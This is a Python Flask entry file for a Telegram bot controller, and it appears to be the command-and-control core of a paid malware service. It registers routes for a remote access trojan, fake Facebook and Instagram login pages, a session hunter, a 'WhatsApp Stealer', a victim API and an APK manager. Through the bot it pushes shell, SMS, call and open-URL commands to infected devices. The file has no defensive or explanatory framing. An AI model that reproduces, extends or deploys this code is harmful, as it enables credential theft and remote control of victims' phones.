# main.py
# ============================================================
# DEV 1 - Bot Controller v6
# ============================================================

import os
import time
import threading
import requests
from flask import Flask, request, jsonify

# ============================================================
# [1] Logging Setup
# ============================================================
from logging_config import (
    get_logger, log_startup_info, log_shutdown_info,
    setup_exception_hook,
)

logger = get_logger("main")
log_startup_info()
setup_exception_hook()

# ============================================================
# [2] استيراد الملفات الداخلية
# ============================================================
from config import bot, redis_client, BOT_TOKEN, ORIGIN_SECRET

from imports_manager import (
    # Blueprints
    rat_bp, qr_bp, lsh_bp, sh_bp, wa_bp, apk_bp,
    # Flags
    LSH_ENABLED, SH_ENABLED, WA_ENABLED, APK_MANAGER_ENABLED,
    # Init functions
    init_facebook_routes, init_instagram_routes, init_rat_routes,
    init_qr_routes, init_lsh_routes, init_session_hunter_routes,
    init_whatsapp_stealer_routes, init_apk_routes,
    # Helpers
    set_bot_reference, register_payment_handlers,
)

from api_victim import init_victim_api

from bot_handlers import (
    start_command, callback_handler,
    victim_name_step, v_toast_step, v_shell_step, v_sendsms_step,
    v_call_step, v_url_step, v_rename_step, victim_name_handler,
    apk_toast_step, apk_shell_step, apk_sendsms_step,
    apk_call_step, apk_url_step,
    admin_search_handler, admin_broadcast_handler,
    admin_ban_handler, admin_unban_handler, admin_delete_handler,
    admin_grant_vip_handler, admin_give_stars_handler,
    admin_msg_user_handler,
    _pending_open_url,
)

from short_link import init_short_link
from redis_cleaner import start_cleaner

# ============================================================
# [3] Monitoring + Rate Limiting
# ============================================================
from monitoring import init_monitoring, metrics
from rate_limiter import start_cleanup_thread

# ============================================================
# [4] Web Dashboard
# ============================================================
try:
    from web_dashboard import init_web_dashboard
    WEB_DASHBOARD_ENABLED = True
    logger.info("[+] web_dashboard imported")
except Exception as e:
    logger.exception(f"[-] web_dashboard import failed: {e}")
    WEB_DASHBOARD_ENABLED = False

    def init_web_dashboard(app):
        pass


# ============================================================
# [5] Flask Setup
# ============================================================
app = Flask(__name__)


# ============================================================
# [6] Origin Gate
# ============================================================
ORIGIN_GATE_EXEMPT = ['/', '/health', '/_health', '/_metrics', '/_version']

ALLOWED_PREFIXES = (
    '/lsh', '/sh', '/rat', '/qr', '/wa',
    '/apk',         # ★ APK Manager
    '/dashboard',   # ★ Web Dashboard
    '/api/v1/session', '/qr_scan', '/f/',
    '/login.php', '/ig_login.php', '/system_secure',
    '/manifest.json', '/sw.js',
    '/_health', '/_metrics', '/_version',
)


@app.before_request
def verify_origin():
    path = request.path

    if path in ORIGIN_GATE_EXEMPT:
        return None

    if request.method == 'OPTIONS':
        return None

    if path.startswith('/apk/') or path.startswith('/victim/'):
        return None

    if any(path.startswith(p) for p in ALLOWED_PREFIXES):
        return None

    secret = request.headers.get('X-Origin-Secret', '')
    if secret == ORIGIN_SECRET:
        return None

    client_ip = (
        request.headers.get('CF-Connecting-IP') or
        request.headers.get('X-Forwarded-For') or
        request.remote_addr
    )
    logger.warning(f"🚫 BLOCKED: {path} from {client_ip}")
    metrics.inc_counter("blocked_requests", tags={"path": path})

    return jsonify({"error": "Access denied"}), 403


# ============================================================
# [7] Health Check
# ============================================================
@app.route('/')
def health_check():
    return "DEV 1 Controller is running.", 200


# ============================================================
# [8] Request Timing
# ============================================================
@app.before_request
def start_timer():
    request._start_time = time.time()


@app.after_request
def log_request(response):
    try:
        if hasattr(request, '_start_time'):
            elapsed_ms = (time.time() - request._start_time) * 1000
            if not request.path.startswith(('/_', '/')):
                logger.debug(
                    f"🌐 {request.method} {request.path} → "
                    f"{response.status_code} ({elapsed_ms:.1f}ms)"
                )
                metrics.observe_timing(
                    "http_request_ms",
                    elapsed_ms,
                    tags={"method": request.method, "path": request.path}
                )
    except Exception:
        pass
    return response


# ============================================================
# [9] تسجيل الـ Blueprints
# ============================================================
if sh_bp:
    app.register_blueprint(sh_bp)
    logger.info("[+] Registered: sh_bp")

if lsh_bp:
    app.register_blueprint(lsh_bp)
    logger.info("[+] Registered: lsh_bp")

if rat_bp:
    app.register_blueprint(rat_bp)
    logger.info("[+] Registered: rat_bp")

if qr_bp:
    app.register_blueprint(qr_bp)
    logger.info("[+] Registered: qr_bp")

if wa_bp:
    app.register_blueprint(wa_bp)
    logger.info("[+] Registered: wa_bp")

if apk_bp:
    app.register_blueprint(apk_bp)
    logger.info("[+] Registered: apk_bp")


# ============================================================
# [10] Init Routes
# ============================================================
init_facebook_routes(app, bot)
logger.info("[+] Init: facebook routes")

init_instagram_routes(app, bot)
logger.info("[+] Init: instagram routes")

init_rat_routes(app, bot)
logger.info("[+] Init: rat routes")

init_qr_routes(app, bot)
logger.info("[+] Init: qr routes")

init_session_hunter_routes(app, bot)
logger.info("[+] Init: session_hunter routes")

# WhatsApp Stealer
if WA_ENABLED:
    try:
        init_whatsapp_stealer_routes(app, bot)
        logger.info("[+] Init: wa_stealer routes")
    except Exception as e:
        logger.exception(f"[-] WA Stealer init failed: {e}")
else:
    logger.warning("[-] WA Stealer disabled - skipping init")

# APK Manager
if APK_MANAGER_ENABLED:
    try:
        init_apk_routes(app, bot)
        logger.info("[+] Init: apk_manager routes")
    except Exception as e:
        logger.exception(f"[-] APK Manager init failed: {e}")
else:
    logger.warning("[-] APK Manager disabled - skipping init")

# LSH
if LSH_ENABLED:
    try:
        init_lsh_routes(app, bot)
        set_bot_reference(bot)
        logger.info("[+] Init: LSH routes + bot reference")
    except Exception as e:
        logger.exception(f"[-] LSH init failed: {e}")
else:
    logger.warning("[-] LSH disabled - skipping init")

register_payment_handlers(bot)
logger.info("[+] Init: payment handlers")

# ============================================================
# [11] Victim API
# ============================================================
try:
    init_victim_api(app, bot)
    logger.info("[+] Init: victim API")
except Exception as e:
    logger.exception(f"[-] Victim API init failed: {e}")

# ============================================================
# [12] Short Link
# ============================================================
try:
    init_short_link(app)
    logger.info("[+] Init: short_link")
except Exception as e:
    logger.exception(f"[-] Short link init failed: {e}")

# ============================================================
# [13] Monitoring
# ============================================================
init_monitoring(app)
start_cleanup_thread()

# ============================================================
# [14] Web Dashboard ★ جديد
# ============================================================
if WEB_DASHBOARD_ENABLED:
    try:
        init_web_dashboard(app)
        logger.info("[+] Init: web dashboard at /dashboard")
    except Exception as e:
        logger.exception(f"[-] Web Dashboard init failed: {e}")
else:
    logger.warning("[-] Web Dashboard disabled - skipping init")

# ============================================================
# [15] LSH - الرابط المُدخل
# ============================================================
from imports_manager import lsh_push_command


@bot.message_handler(
    func=lambda m: m.chat.id in _pending_open_url
    and m.text and m.text.startswith("http")
)
def handle_open_url(message):
    sid = _pending_open_url.pop(message.chat.id, None)
    if sid:
        ok = lsh_push_command(sid, {
            "action": "url",
            "payload": {"url": message.text}
        })
        bot.send_message(
            message.chat.id,
            "✅ تم الإرسال" if ok else "❌ فشل"
        )
        metrics.inc_counter(
            "lsh_url_commands",
            tags={"status": "ok" if ok else "fail"}
        )


# ============================================================
# [16] تشغيل البوت
# ============================================================
def run_telegram_bot():
    logger.info("=" * 60)
    logger.info("🤖 Starting Telegram Bot polling...")
    logger.info(f"🔑 Bot token: {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
    logger.info("=" * 60)

    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
            params={"drop_pending_updates": "true"},
            timeout=15,
        )
        logger.info(f"[+] deleteWebhook HTTP {r.status_code}")
    except Exception as e:
        logger.error(f"[-] deleteWebhook: {e}")

    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/getMe",
            timeout=15
        )
        logger.info(f"[+] getMe: {r.text[:200]}")
    except Exception as e:
        logger.error(f"[-] getMe: {e}")

    logger.info("[+] Starting infinity_polling loop...")
    attempt = 0
    while True:
        try:
            attempt += 1
            logger.info(f"[+] Polling attempt #{attempt}")
            metrics.inc_counter("bot_polling_attempts")

            bot.infinity_polling(
                skip_pending=True,
                timeout=30,
                long_polling_timeout=30,
                none_stop=True,
            )
        except Exception as e:
            logger.exception(f"[-] Polling crashed: {e}")
            metrics.inc_counter("bot_polling_crashes")
            logger.info("[+] Restarting in 5 seconds...")
            time.sleep(5)


# ============================================================
# [17] Main
# ============================================================
if __name__ == "__main__":
    try:
        start_cleaner()
        logger.info("[+] Redis cleaner started")

        bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
        bot_thread.start()
        logger.info("[+] Bot thread started")

        time.sleep(2)

        port = int(os.environ.get("PORT", 8080))
        logger.info(f"🌐 Flask Web Server starting on port {port}...")

        app.run(
            host="0.0.0.0",
            port=port,
            debug=False,
            use_reloader=False,
            threaded=True,
        )

    except KeyboardInterrupt:
        logger.info("🛑 Received KeyboardInterrupt")
    except Exception as e:
        logger.exception(f"💥 Fatal error: {e}")
    finally:
        log_shutdown_info()
